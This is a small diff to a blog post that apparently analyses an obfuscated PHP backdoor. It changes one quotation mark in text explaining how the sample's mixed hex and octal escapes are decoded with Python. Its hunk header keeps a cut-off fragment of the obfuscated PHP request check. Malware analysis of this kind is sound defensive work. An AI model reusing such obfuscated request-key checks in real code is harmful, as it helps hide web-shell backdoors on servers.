@@ -99,7 +99,7 @@ if (isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\
 # 
 {% endhighlight %}
 
-I changed the formatting a little just for readability. Now we see a mix of HEX and octal obfuscation. If we convert the keys starting with "\x" from HEX to ASCII and the keys in octal form starting with '\[num]' using python we get the following.
+I changed the formatting a little just for readability. Now we see a mix of HEX and octal obfuscation. If we convert the keys starting with "\x" from HEX to ASCII and the keys in octal form starting with "\[num]" using python we get the following.
 
 {% highlight python linenos %}
 # python
